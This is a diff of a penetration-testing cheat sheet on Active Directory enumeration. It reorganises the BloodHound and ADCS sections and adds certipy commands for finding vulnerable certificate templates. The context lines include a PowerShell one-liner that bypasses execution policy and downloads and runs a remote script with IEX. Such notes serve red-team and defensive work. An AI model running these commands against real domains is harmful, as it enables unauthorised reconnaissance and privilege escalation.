@@ -9,7 +9,7 @@ comments: false
 
 ## Mapping & Enumeration
 
-### Bloodhound
+### Basic Bloodhound
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
 ```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
@@ -26,6 +26,14 @@ sudo neo4j start
 ```
 {: .nolineno }
 Then execute BloodHound and import the zip file.
+
+### Extended Bloodhound (PKI)
+Best thing to do is to use Certipy to get a bloodhound extract, including everything about ADCS (templates, etc.) :
+```bash
+certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
+```
+{: .nolineno }
+Then, use Olivier Lyak's bloohound, which includes PKIs stuff (<https://github.com/ly4k/BloodHound>). This will give you the opportunity to check for a lot of knows attacks on ADCS (ESC1 to ESC10).
 
 ### Goddi
 To get all the important information from the Active Directory :
@@ -178,15 +186,7 @@ crackmapexec smb IP_ADDRESS/MASK -u 'USERNAME' -k --use-kcache
 {: .nolineno }
 
 ## Active Directory Certificate Services (ADCS)
-A lot of attacks exists. First thing to do is to check for vulnerable templates.
-### Check for vulnerable templates
-Using python tool on your machine like Certipy or on a domain-joined machine using Certify.exe. Play the find command to get a global view with Bloodhound.
-```bash
-certipy find -bloodhound -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
-```
-{: .nolineno }
-Then, use Olivier Lyak's bloohound, which includes PKIs stuff (https://github.com/ly4k/BloodHound).
-You can also try to find directly vulnerable templates with certipy :
+You can try to find directly vulnerable templates with certipy. Good to use /currentuser option if you only have one valid account :
 ```bash
 certipy find -vulnerable -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP
 ```
